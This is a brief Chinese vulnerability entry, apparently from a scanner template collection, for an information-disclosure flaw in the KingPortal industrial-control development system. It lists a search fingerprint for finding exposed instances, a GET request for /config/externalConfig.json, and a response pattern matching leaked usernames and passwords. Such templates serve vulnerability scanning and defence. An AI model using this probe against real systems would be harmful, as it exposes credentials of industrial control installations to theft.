# 工控软件KingPortal开发系统信息泄露漏洞2

工控软件KingPortal开发系统 ｜ 信息泄露 ｜ —
- **指纹**：`body="/public/javascripts/Common/Util/km_util.js"`
- **请求**：`GET /config/externalConfig.json HTTP/1.1`
- **响应特征**：200 ^(?=.*?username)(?=.*?password).*?$